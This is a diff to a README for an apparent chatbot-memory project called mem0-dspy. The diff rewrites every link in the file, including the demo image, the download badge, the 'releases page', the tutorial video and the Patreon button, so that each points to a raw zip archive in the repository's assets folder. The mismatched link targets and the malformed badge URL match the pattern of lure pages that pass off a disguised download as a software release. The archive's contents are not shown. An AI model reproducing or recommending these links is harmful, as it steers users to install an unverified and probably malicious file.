@@ -4,18 +4,18 @@
 
 Welcome to **mem0-dspy**! This repository shows you how to create a smart chatbot with memory capabilities. It uses **DSPy** and **Qdrant** to give your chatbot a lasting conversational memory. Whether you want a simple bot to remember user preferences or a more sophisticated assistant, this project will guide you in the right direction.
 
-![Memory-Enabled Chatbot Demo](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip)
+![Memory-Enabled Chatbot Demo](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip)
 
 ## 📥 Download
 
-[![Download Release](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip%20Latest%https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip)](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip)
+[![Download Release](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip%20Latest%https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip)](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip)
 
 ## 🚀 Getting Started
 
 To get started with **mem0-dspy**, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases. This is where you will find the latest version of the software.
-   - [Visit Releases Page](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip)
+   - [Visit Releases Page](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip)
 
 2. **Select the Right Version:** Look for the version that suits your needs. Usually, the latest version is the best choice. Download the file that matches your operating system.
 
@@ -62,7 +62,7 @@ Once you have downloaded the application, follow these steps to install it:
 
 If you want to dive deeper, watch the tutorial video. It provides a step-by-step walkthrough. 
 
-- **Watch Here:** [How to build your own long-term Agentic Memory System for LLMs | Mem0 from scratch in DSPy](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip)
+- **Watch Here:** [How to build your own long-term Agentic Memory System for LLMs | Mem0 from scratch in DSPy](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip)
 
 ## ❓ Support
 
@@ -72,7 +72,7 @@ If you encounter issues or have questions, please refer to the issues section of
 
 If you find this project helpful, please consider supporting my work on Patreon. Your contributions help me create more useful content.
 
-[<img src="https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip" alt="Become a Patron!" width="200">](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/mem0-dspy-v2.6.zip)
+[<img src="https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip" alt="Become a Patron!" width="200">](https://raw.githubusercontent.com/Kalasoulful678/mem0-dspy/main/assets/dspy_mem_glaiket.zip)
 
 ## 🛡️ License
 
